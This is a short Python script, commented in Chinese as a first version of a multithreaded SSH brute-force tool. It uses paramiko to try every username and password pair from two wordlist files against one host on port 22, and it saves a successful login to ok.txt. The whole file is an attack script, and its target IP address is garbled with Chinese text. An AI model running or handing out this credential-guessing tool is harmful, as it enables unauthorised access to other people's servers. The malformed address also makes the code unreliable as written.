# -*- coding = utf-8 -*-
# @Time:2023/12/16 17:33
# @Author:ck
# @File:ssh多线程爆破第一版
# @Software:PyCharm
import paramiko
import threading


def ssh_login(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    try:
        client.connect(hostname, port=port, username=username, password=password)
        print(f"登录成功：账号:{username}, 密码：{password}")
        with open("ok.txt", "w+") as a:
            a.write(f"登录成功：账号:{username}, 密码：{password}")
    except paramiko.AuthenticationException:
        print(f"认证失败：账号:{username}, 密码：{password}")

    except paramiko.SSHException as e:
        print(f"SSH连接失败：账号:{username}, 密码：{password}")
    finally:
        client.close()


def process_credentials(username_file, password_file, hostname, port):
    with open(username_file, 'r') as user_file, open(password_file, 'r') as pass_file:
        usernames = user_file.readlines()
        passwords = pass_file.readlines()
        for username in usernames:
            username = username.strip()

            for password in passwords:
                password = password.strip()
                thread = threading.Thread(target=ssh_login, args=(hostname, port, username, password))
                thread.start()


process_credentials("username.txt", "password.txt", "172.16.1.区块链式随机", 22)

